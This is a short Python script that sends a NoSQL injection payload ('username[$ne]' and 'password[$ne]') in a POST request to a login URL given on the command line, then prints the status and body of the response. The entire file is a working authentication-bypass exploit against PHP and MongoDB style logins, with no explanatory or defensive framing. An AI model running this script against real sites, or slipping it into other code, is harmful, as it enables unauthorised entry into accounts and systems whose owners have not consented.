import os
import sys
import requests
import json

# Get command-line arguments
args = sys.argv[1:]

if args:
    web_addr = args[0]

    # Target URL
    login_url = web_addr

    # Send actual array data (which PHP sees as an associative array)
    payload = {
        "username[$ne]": "1",  # becomes: $_POST['username']['$ne'] = "1"
        "password[$ne]": "1"
    }

    response = requests.post(login_url, data=payload)

    print("Status:", response.status_code)
    print("Body:", response.text)